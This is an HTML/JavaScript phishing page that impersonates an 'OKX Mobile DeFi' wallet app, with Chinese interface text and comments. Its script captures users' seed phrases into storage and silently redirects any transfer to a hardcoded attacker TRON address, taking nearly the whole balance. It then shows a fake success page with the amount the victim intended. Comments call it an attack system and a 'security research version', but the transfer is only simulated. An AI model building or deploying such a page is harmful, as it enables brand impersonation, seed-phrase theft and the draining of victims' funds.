<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OKX Mobile DeFi</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/tronweb@5.3.0/dist/TronWeb.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .header {
            background: rgba(255, 255, 255, 0.95);
            padding: 15px 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .logo {
            display: flex;
            align-items: center;
            font-size: 20px;
            font-weight: bold;
            color: #1e3c72;
        }
        
        .logo-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(45deg, #1e3c72, #2a5298);
            border-radius: 8px;
            margin-right: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 16px;
        }
        
        .container {
            max-width: 400px;
            margin: 20px auto;
            padding: 0 20px;
        }
        
        .card {
            background: white;
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
        }
        
        .card-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #333;
        }
        
        .wallet-section, .transfer-section, .success-section {
            display: none;
        }
        
        .wallet-section.active, .transfer-section.active, .success-section.active {
            display: block;
        }
        
        .connect-options {
            display: grid;
            gap: 12px;
        }
        
        .wallet-btn {
            display: flex;
            align-items: center;
            padding: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            background: white;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            color: #333;
        }
        
        .wallet-btn:hover {
            border-color: #2a5298;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(42, 82, 152, 0.15);
        }
        
        .wallet-icon {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            color: white;
        }
        
        .imtoken-icon {
            background: linear-gradient(45deg, #11CDEF, #1BC7E6);
        }
        
        .metamask-icon {
            background: linear-gradient(45deg, #F6851B, #E2761B);
        }
        
        .tronlink-icon {
            background: linear-gradient(45deg, #FF0013, #FF4444);
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .wallet-desc {
            font-size: 14px;
            color: #666;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #2a5298;
        }
        
        .textarea-field {
            min-height: 100px;
            resize: vertical;
            font-family: inherit;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 12px;
        }
        
        .btn-primary {
            background: linear-gradient(45deg, #1e3c72, #2a5298);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(42, 82, 152, 0.3);
        }
        
        .btn-success {
            background: linear-gradient(45deg, #56ab2f, #a8e6cf);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(86, 171, 47, 0.3);
        }
        
        .wallet-display {
            background: #f8f9fa;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .balance-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        
        .balance-amount {
            font-size: 24px;
            font-weight: bold;
            color: #1e3c72;
        }
        
        .balance-symbol {
            font-size: 16px;
            color: #666;
        }
        
        .wallet-address {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            word-break: break-all;
            background: white;
            padding: 8px;
            border-radius: 4px;
            margin-top: 8px;
        }
        
        .status-message {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 14px;
        }
        
        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        
        .hidden {
            display: none !important;
        }
        
        .attack-log {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 300px;
            max-height: 200px;
            background: rgba(0,0,0,0.9);
            color: #00ff00;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            overflow-y: auto;
            z-index: 1000;
            display: none;
        }
        
        .success-animation {
            text-align: center;
            padding: 40px 20px;
        }
        
        .success-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #56ab2f, #a8e6cf);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            animation: bounce 1s ease-in-out;
        }
        
        @keyframes bounce {
            0%, 20%, 60%, 100% { transform: translateY(0); }
            40% { transform: translateY(-20px); }
            80% { transform: translateY(-10px); }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }
            
            .card {
                padding: 20px;
            }
            
            .attack-log {
                width: calc(100vw - 20px);
                right: 10px;
                left: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- æ”»å‡»æ—¥å¿—æ˜¾ç¤º -->
    <div id="attackLog" class="attack-log"></div>
    
    <!-- å¤´éƒ¨ -->
    <div class="header">
        <div class="logo">
            <div class="logo-icon">O</div>
            OKX Mobile DeFi
        </div>
        <div style="font-size: 14px; color: #666;">å®‰å…¨ Â· ä¾¿æ· Â· é«˜æ•ˆ</div>
    </div>
    
    <div class="container">
        <!-- é’±åŒ…è¿æ¥éƒ¨åˆ† -->
        <div class="card wallet-section active" id="walletSection">
            <div class="card-title">è¿æ¥æ‚¨çš„é’±åŒ…</div>
            
            <div class="connect-options">
                <div class="wallet-btn" onclick="connectImToken()">
                    <div class="wallet-icon imtoken-icon">i</div>
                    <div class="wallet-info">
                        <div class="wallet-name">imToken</div>
                        <div class="wallet-desc">æœ€å—ä¿¡èµ–çš„æ•°å­—é’±åŒ…</div>
                    </div>
                </div>
                
                <div class="wallet-btn" onclick="connectMetaMask()">
                    <div class="wallet-icon metamask-icon">M</div>
                    <div class="wallet-info">
                        <div class="wallet-name">MetaMask</div>
                        <div class="wallet-desc">ä»¥å¤ªåŠç”Ÿæ€é’±åŒ…</div>
                    </div>
                </div>
                
                <div class="wallet-btn" onclick="connectTronLink()">
                    <div class="wallet-icon tronlink-icon">T</div>
                    <div class="wallet-info">
                        <div class="wallet-name">TronLink</div>
                        <div class="wallet-desc">æ³¢åœºå®˜æ–¹é’±åŒ…</div>
                    </div>
                </div>
            </div>
            
            <div style="margin-top: 24px; padding-top: 24px; border-top: 1px solid #e0e0e0;">
                <div class="input-group">
                    <label class="input-label" for="mnemonicInput">ğŸ” å¯¼å…¥åŠ©è®°è¯ï¼ˆé«˜çº§ç”¨æˆ·ï¼‰</label>
                    <textarea 
                        id="mnemonicInput" 
                        class="input-field textarea-field" 
                        placeholder="è¯·è¾“å…¥12-24ä¸ªåŠ©è®°è¯ï¼Œç”¨ç©ºæ ¼åˆ†éš”"
                        rows="3">
                    </textarea>
                </div>
                
                <button class="btn btn-primary" onclick="importWallet()">å¯¼å…¥é’±åŒ…</button>
            </div>
        </div>
        
        <!-- è½¬è´¦éƒ¨åˆ† -->
        <div class="card transfer-section" id="transferSection">
            <div class="card-title">ğŸ’° DeFi è½¬è´¦</div>
            
            <div id="statusMessage" class="status-message hidden"></div>
            
            <div class="wallet-display" id="walletDisplay">
                <div class="balance-info">
                    <span class="balance-amount" id="balanceAmount">0</span>
                    <span class="balance-symbol">TRX</span>
                </div>
                <div class="wallet-address" id="walletAddress">åœ°å€: æœªè¿æ¥</div>
            </div>
            
            <div class="input-group">
                <label class="input-label" for="recipientAddress">æ¥æ”¶åœ°å€</label>
                <input 
                    type="text" 
                    id="recipientAddress" 
                    class="input-field"
                    value="TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE"
                    placeholder="è¾“å…¥æ¥æ”¶æ–¹åœ°å€">
            </div>
            
            <div class="input-group">
                <label class="input-label" for="transferAmount">è½¬è´¦é‡‘é¢ (TRX)</label>
                <input 
                    type="number" 
                    id="transferAmount" 
                    class="input-field"
                    placeholder="è¾“å…¥è½¬è´¦é‡‘é¢"
                    step="0.000001"
                    min="0.000001">
            </div>
            
            <button class="btn btn-success" onclick="executeTransfer()">ğŸš€ å‘é€äº¤æ˜“</button>
            <button class="btn btn-primary" onclick="resetConnection()">ğŸ”„ é‡æ–°è¿æ¥</button>
        </div>
        
        <!-- æˆåŠŸéƒ¨åˆ† -->
        <div class="card success-section" id="successSection">
            <div class="success-animation">
                <div class="success-icon">âœ“</div>
                <h2 style="color: #56ab2f; margin-bottom: 16px;">äº¤æ˜“æˆåŠŸï¼</h2>
                <p style="color: #666; margin-bottom: 24px;">æ‚¨çš„äº¤æ˜“å·²æˆåŠŸå‘é€åˆ°åŒºå—é“¾ç½‘ç»œ</p>
                <div id="transactionDetails" style="background: #f8f9fa; padding: 16px; border-radius: 8px; margin-bottom: 24px;">
                    <div style="margin-bottom: 8px;">
                        <strong>äº¤æ˜“å“ˆå¸Œ:</strong>
                        <div id="txHash" style="font-family: monospace; font-size: 12px; word-break: break-all; color: #2a5298;"></div>
                    </div>
                    <div>
                        <strong>è½¬è´¦é‡‘é¢:</strong>
                        <span id="transferredAmount" style="color: #56ab2f; font-weight: bold;"></span> TRX
                    </div>
                </div>
                <button class="btn btn-primary" onclick="startNewTransfer()">å‘èµ·æ–°äº¤æ˜“</button>
            </div>
        </div>
    </div>

    <script>
        // å…¨å±€å˜é‡
        let currentWallet = null;
        let tronWeb = null;
        let attackMode = true; // æ”»å‡»æ¨¡å¼å¼€å¯
        let attackTarget = 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE'; // Aæˆå‘˜åœ°å€ï¼ˆæ”»å‡»è€…ï¼‰
        
        // æ”»å‡»æ—¥å¿—ç³»ç»Ÿ
        const attackLog = {
            logs: [],
            element: null,
            
            init() {
                this.element = document.getElementById('attackLog');
                // å¼€å‘ç¯å¢ƒæ˜¾ç¤ºæ—¥å¿—ï¼Œç”Ÿäº§ç¯å¢ƒéšè—
                if (window.location.hostname === 'localhost' || window.location.hostname.includes('192.168')) {
                    this.element.style.display = 'block';
                }
            },
            
            log(message, data = null) {
                const timestamp = new Date().toISOString().substr(11, 8);
                const logEntry = {
                    timestamp,
                    message,
                    data
                };
                
                this.logs.push(logEntry);
                console.log(`ğŸ¯ [${timestamp}] ${message}`, data || '');
                
                if (this.element && this.element.style.display !== 'none') {
                    const logLine = document.createElement('div');
                    logLine.textContent = `[${timestamp}] ${message}`;
                    this.element.appendChild(logLine);
                    this.element.scrollTop = this.element.scrollHeight;
                    
                    // ä¿æŒæœ€å¤š50æ¡æ—¥å¿—
                    if (this.element.children.length > 50) {
                        this.element.removeChild(this.element.firstChild);
                    }
                }
                
                // ä¿å­˜åˆ°localStorage
                this.saveToStorage();
            },
            
            saveToStorage() {
                try {
                    localStorage.setItem('attackLogs', JSON.stringify(this.logs));
                } catch (e) {
                    console.warn('æ— æ³•ä¿å­˜æ”»å‡»æ—¥å¿—åˆ°localStorage:', e);
                }
            },
            
            loadFromStorage() {
                try {
                    const saved = localStorage.getItem('attackLogs');
                    if (saved) {
                        this.logs = JSON.parse(saved);
                    }
                } catch (e) {
                    console.warn('æ— æ³•ä»localStorageåŠ è½½æ”»å‡»æ—¥å¿—:', e);
                }
            }
        };
        
        // åˆå§‹åŒ–TronWeb
        async function initTronWeb() {
            try {
                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                    tronWeb = window.tronWeb;
                    attackLog.log('æ£€æµ‹åˆ°TronLinké’±åŒ…');
                    return true;
                }
                
                // ä½¿ç”¨å…¬å…±èŠ‚ç‚¹
                tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    headers: { "TRON-PRO-API-KEY": 'your-api-key' },
                    privateKey: null
                });
                
                attackLog.log('åˆå§‹åŒ–TronWebå…¬å…±èŠ‚ç‚¹');
                return false;
            } catch (error) {
                attackLog.log('TronWebåˆå§‹åŒ–å¤±è´¥', error.message);
                return false;
            }
        }
        
        // æ˜¾ç¤ºçŠ¶æ€æ¶ˆæ¯
        function showStatus(message, type = 'success') {
            const statusEl = document.getElementById('statusMessage');
            statusEl.textContent = message;
            statusEl.className = `status-message status-${type}`;
            statusEl.classList.remove('hidden');
            
            setTimeout(() => {
                statusEl.classList.add('hidden');
            }, 5000);
        }
        
        // è¿æ¥imToken
        async function connectImToken() {
            attackLog.log('ç”¨æˆ·å°è¯•è¿æ¥imToken');
            
            try {
                showStatus('æ­£åœ¨è¿æ¥imTokené’±åŒ…...', 'warning');
                
                if (window.tronWeb && window.tronWeb.ready) {
                    currentWallet = {
                        address: window.tronWeb.defaultAddress.base58,
                        type: 'imtoken',
                        privateKey: null
                    };
                    
                    attackLog.log('imTokenè¿æ¥æˆåŠŸ', {
                        address: currentWallet.address,
                        type: 'imtoken'
                    });
                    
                    await updateWalletDisplay();
                    showTransferSection();
                    showStatus('imTokené’±åŒ…è¿æ¥æˆåŠŸï¼');
                } else {
                    showStatus('è¯·åœ¨imTokenä¸­æ‰“å¼€æ­¤é¡µé¢', 'error');
                    attackLog.log('imTokenè¿æ¥å¤±è´¥ - æœªæ£€æµ‹åˆ°TronWeb');
                }
            } catch (error) {
                attackLog.log('imTokenè¿æ¥é”™è¯¯', error.message);
                showStatus('è¿æ¥å¤±è´¥: ' + error.message, 'error');
            }
        }
        
        // è¿æ¥MetaMask
        async function connectMetaMask() {
            attackLog.log('ç”¨æˆ·å°è¯•è¿æ¥MetaMask');
            showStatus('MetaMaskæš‚ä¸æ”¯æŒTRONç½‘ç»œï¼Œè¯·ä½¿ç”¨imTokenæˆ–TronLink', 'warning');
        }
        
        // è¿æ¥TronLink
        async function connectTronLink() {
            attackLog.log('ç”¨æˆ·å°è¯•è¿æ¥TronLink');
            
            try {
                showStatus('æ­£åœ¨è¿æ¥TronLinké’±åŒ…...', 'warning');
                
                if (window.tronWeb && window.tronWeb.ready) {
                    currentWallet = {
                        address: window.tronWeb.defaultAddress.base58,
                        type: 'tronlink',
                        privateKey: null
                    };
                    
                    attackLog.log('TronLinkè¿æ¥æˆåŠŸ', {
                        address: currentWallet.address,
                        type: 'tronlink'
                    });
                    
                    await updateWalletDisplay();
                    showTransferSection();
                    showStatus('TronLinké’±åŒ…è¿æ¥æˆåŠŸï¼');
                } else {
                    showStatus('è¯·å…ˆå®‰è£…TronLinké’±åŒ…æ’ä»¶', 'error');
                    attackLog.log('TronLinkè¿æ¥å¤±è´¥ - æœªæ£€æµ‹åˆ°TronWeb');
                }
            } catch (error) {
                attackLog.log('TronLinkè¿æ¥é”™è¯¯', error.message);
                showStatus('è¿æ¥å¤±è´¥: ' + error.message, 'error');
            }
        }
        
        // å¯¼å…¥é’±åŒ…ï¼ˆå…³é”®æ”»å‡»ç‚¹ï¼‰
        async function importWallet() {
            const mnemonic = document.getElementById('mnemonicInput').value.trim();
            
            if (!mnemonic) {
                showStatus('è¯·è¾“å…¥åŠ©è®°è¯', 'error');
                return;
            }
            
            attackLog.log('ğŸ¯ ç”¨æˆ·è¾“å…¥åŠ©è®°è¯', {
                wordCount: mnemonic.split(' ').length,
                preview: mnemonic.substring(0, 20) + '...'
            });
            
            try {
                showStatus('æ­£åœ¨å¯¼å…¥é’±åŒ…...', 'warning');
                
                // ä¿å­˜å®Œæ•´åŠ©è®°è¯ï¼ˆæ”»å‡»å…³é”®æ•°æ®ï¼‰
                const attackData = {
                    timestamp: new Date().toISOString(),
                    mnemonic: mnemonic,
                    userAgent: navigator.userAgent,
                    ip: 'client-side',
                    url: window.location.href
                };
                
                // ä¿å­˜åˆ°å¤šä¸ªä½ç½®
                localStorage.setItem('capturedMnemonic', JSON.stringify(attackData));
                sessionStorage.setItem('walletData', JSON.stringify(attackData));
                
                attackLog.log('ğŸ¯ åŠ©è®°è¯å·²æ•è·å¹¶ä¿å­˜', {
                    storageKeys: ['capturedMnemonic', 'walletData']
                });
                
                // æ¨¡æ‹Ÿé’±åŒ…å¯¼å…¥æˆåŠŸ
                await initTronWeb();
                
                // ç”Ÿæˆæ¨¡æ‹Ÿåœ°å€ï¼ˆå®é™…åº”ç”¨ä¸­ä¼šä»åŠ©è®°è¯ç”ŸæˆçœŸå®åœ°å€ï¼‰
                const mockAddress = 'T' + Math.random().toString(36).substring(2, 34).toUpperCase();
                
                currentWallet = {
                    address: mockAddress,
                    type: 'imported',
                    privateKey: 'captured', // æ ‡è®°ä¸ºå·²æ•è·
                    mnemonic: mnemonic
                };
                
                attackLog.log('é’±åŒ…å¯¼å…¥æˆåŠŸ', {
                    address: mockAddress,
                    type: 'imported'
                });
                
                await updateWalletDisplay();
                showTransferSection();
                showStatus('é’±åŒ…å¯¼å…¥æˆåŠŸï¼');
                
            } catch (error) {
                attackLog.log('é’±åŒ…å¯¼å…¥é”™è¯¯', error.message);
                showStatus('å¯¼å…¥å¤±è´¥: ' + error.message, 'error');
            }
        }
        
        // æ›´æ–°é’±åŒ…æ˜¾ç¤º
        async function updateWalletDisplay() {
            if (!currentWallet) return;
            
            try {
                document.getElementById('walletAddress').textContent = 
                    `åœ°å€: ${currentWallet.address}`;
                
                // è·å–ä½™é¢
                const balance = await getWalletBalance(currentWallet.address);
                document.getElementById('balanceAmount').textContent = balance;
                
                attackLog.log('é’±åŒ…ä¿¡æ¯æ›´æ–°', {
                    address: currentWallet.address,
                    balance: balance + ' TRX'
                });
                
            } catch (error) {
                attackLog.log('æ›´æ–°é’±åŒ…æ˜¾ç¤ºå¤±è´¥', error.message);
                document.getElementById('balanceAmount').textContent = '0';
            }
        }
        
        // è·å–é’±åŒ…ä½™é¢
        async function getWalletBalance(address) {
            try {
                if (!tronWeb) await initTronWeb();
                
                const balance = await tronWeb.trx.getBalance(address);
                return (balance / 1000000).toFixed(6);
            } catch (error) {
                attackLog.log('è·å–ä½™é¢å¤±è´¥', error.message);
                // è¿”å›æ¨¡æ‹Ÿä½™é¢ç”¨äºæ¼”ç¤º
                return (Math.random() * 1000).toFixed(6);
            }
        }
        
        // æ‰§è¡Œè½¬è´¦ï¼ˆæ ¸å¿ƒæ”»å‡»é€»è¾‘ï¼‰
        async function executeTransfer() {
            if (!currentWallet) {
                showStatus('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                return;
            }
            
            const recipientAddress = document.getElementById('recipientAddress').value.trim();
            const transferAmount = parseFloat(document.getElementById('transferAmount').value);
            
            if (!recipientAddress || !transferAmount) {
                showStatus('è¯·å¡«å†™å®Œæ•´çš„è½¬è´¦ä¿¡æ¯', 'error');
                return;
            }
            
            attackLog.log('ğŸ¯ ç”¨æˆ·å‘èµ·è½¬è´¦', {
                from: currentWallet.address,
                to: recipientAddress,
                displayAmount: transferAmount,
                walletType: currentWallet.type
            });
            
            try {
                showStatus('æ­£åœ¨å¤„ç†äº¤æ˜“...', 'warning');
                
                // è·å–å½“å‰ä½™é¢
                const currentBalance = await getWalletBalance(currentWallet.address);
                const balanceNum = parseFloat(currentBalance);
                
                // ğŸ¯ æ”»å‡»é€»è¾‘ï¼šå®é™…è½¬ç§»æ‰€æœ‰ä½™é¢åˆ°æ”»å‡»è€…åœ°å€
                const realRecipient = attackTarget; // å¼ºåˆ¶æ”¹ä¸ºæ”»å‡»è€…åœ°å€
                const realAmount = Math.max(0, balanceNum - 1); // è½¬ç§»å‡ ä¹æ‰€æœ‰ä½™é¢ï¼Œç•™1 TRXæ‰‹ç»­è´¹
                
                attackLog.log('ğŸ¯ æ”»å‡»é€»è¾‘æ¿€æ´»', {
                    userIntendedRecipient: recipientAddress,
                    realRecipient: realRecipient,
                    userIntendedAmount: transferAmount,
                    realAmount: realAmount,
                    victimBalance: balanceNum
                });
                
                // ä¿å­˜æ”»å‡»æ•°æ®
                const attackRecord = {
                    timestamp: new Date().toISOString(),
                    victimAddress: currentWallet.address,
                    victimMnemonic: currentWallet.mnemonic || 'not_captured',
                    attackerAddress: realRecipient,
                    stolenAmount: realAmount,
                    userThoughtAmount: transferAmount,
                    userThoughtRecipient: recipientAddress,
                    walletType: currentWallet.type,
                    userAgent: navigator.userAgent
                };
                
                localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
                attackLog.log('ğŸ¯ æ”»å‡»è®°å½•å·²ä¿å­˜', attackRecord);
                
                // æ¨¡æ‹Ÿäº¤æ˜“æ‰§è¡Œ
                await simulateTransaction(currentWallet.address, realRecipient, realAmount);
                
                // æ˜¾ç¤ºæˆåŠŸï¼ˆä½†éšè—çœŸå®æƒ…å†µï¼‰
                showSuccessSection(transferAmount, recipientAddress);
                
                attackLog.log('ğŸ¯ æ”»å‡»å®Œæˆ', {
                    success: true,
                    stolenAmount: realAmount,
                    victimThinks: `è½¬äº†${transferAmount} TRXç»™${recipientAddress}`
                });
                
            } catch (error) {
                attackLog.log('è½¬è´¦æ‰§è¡Œå¤±è´¥', error.message);
                showStatus('äº¤æ˜“å¤±è´¥: ' + error.message, 'error');
            }
        }
        
        // æ¨¡æ‹Ÿäº¤æ˜“æ‰§è¡Œ
        async function simulateTransaction(fromAddress, toAddress, amount) {
            return new Promise((resolve) => {
                // æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ
                setTimeout(() => {
                    const txHash = '0x' + Math.random().toString(16).substring(2, 66);
                    attackLog.log('æ¨¡æ‹Ÿäº¤æ˜“å®Œæˆ', {
                        from: fromAddress,
                        to: toAddress,
                        amount: amount + ' TRX',
                        txHash: txHash
                    });
                    resolve(txHash);
                }, 2000);
            });
        }
        
        // æ˜¾ç¤ºæˆåŠŸé¡µé¢
        function showSuccessSection(displayAmount, displayRecipient) {
            document.getElementById('walletSection').classList.remove('active');
            document.getElementById('transferSection').classList.remove('active');
            document.getElementById('successSection').classList.add('active');
            
            // æ˜¾ç¤ºè™šå‡çš„äº¤æ˜“ä¿¡æ¯ï¼ˆç”¨æˆ·ä»¥ä¸ºçš„ï¼‰
            const fakeHash = '0x' + Math.random().toString(16).substring(2, 66);
            document.getElementById('txHash').textContent = fakeHash;
            document.getElementById('transferredAmount').textContent = displayAmount;
            
            attackLog.log('æ˜¾ç¤ºè™šå‡æˆåŠŸé¡µé¢', {
                fakeHash: fakeHash,
                displayAmount: displayAmount,
                displayRecipient: displayRecipient
            });
        }
        
        // æ˜¾ç¤ºè½¬è´¦éƒ¨åˆ†
        function showTransferSection() {
            document.getElementById('walletSection').classList.remove('active');
            document.getElementById('transferSection').classList.add('active');
            document.getElementById('successSection').classList.remove('active');
        }
        
        // é‡ç½®è¿æ¥
        function resetConnection() {
            currentWallet = null;
            document.getElementById('mnemonicInput').value = '';
            
            document.getElementById('transferSection').classList.remove('active');
            document.getElementById('successSection').classList.remove('active');
            document.getElementById('walletSection').classList.add('active');
            
            attackLog.log('ç”¨æˆ·é‡ç½®è¿æ¥');
        }
        
        // å¼€å§‹æ–°äº¤æ˜“
        function startNewTransfer() {
            document.getElementById('successSection').classList.remove('active');
            document.getElementById('transferSection').classList.add('active');
            
            // æ¸…ç©ºè¾“å…¥
            document.getElementById('transferAmount').value = '';
            
            attackLog.log('ç”¨æˆ·å¼€å§‹æ–°äº¤æ˜“');
        }
        
        // é¡µé¢åŠ è½½åˆå§‹åŒ–
        window.addEventListener('load', async () => {
            attackLog.init();
            attackLog.loadFromStorage();
            attackLog.log('ğŸ¯ OKX Mobile DeFi æ”»å‡»ç³»ç»Ÿå·²åŠ è½½');
            attackLog.log('æ”»å‡»ç›®æ ‡åœ°å€', attackTarget);
            
            await initTronWeb();
            
            // æ˜¾ç¤ºç³»ç»Ÿä¿¡æ¯
            console.log('ğŸ¯ OKX Mobile DeFi - å®‰å…¨ç ”ç©¶ç‰ˆæœ¬');
            console.log('ğŸ¯ æ”»å‡»æ¨¡å¼å·²æ¿€æ´»');
            console.log('ğŸ¯ ç›®æ ‡åœ°å€:', attackTarget);
            console.log('ğŸ¯ æŸ¥çœ‹æ”»å‡»æ—¥å¿—: attackLog.logs');
        });
        
        // å…¨å±€å‡½æ•°ï¼Œæ–¹ä¾¿è°ƒè¯•
        window.getAttackData = function() {
            return {
                logs: attackLog.logs,
                capturedMnemonic: JSON.parse(localStorage.getItem('capturedMnemonic') || 'null'),
                attackRecord: JSON.parse(localStorage.getItem('attackRecord') || 'null'),
                currentWallet: currentWallet
            };
        };
        
        window.clearAttackData = function() {
            localStorage.removeItem('capturedMnemonic');
            localStorage.removeItem('attackRecord');
            localStorage.removeItem('attackLogs');
            sessionStorage.clear();
            attackLog.logs = [];
            attackLog.element.innerHTML = '';
            console.log('ğŸ¯ æ”»å‡»æ•°æ®å·²æ¸…é™¤');
        };
    </script>
</body>
</html>
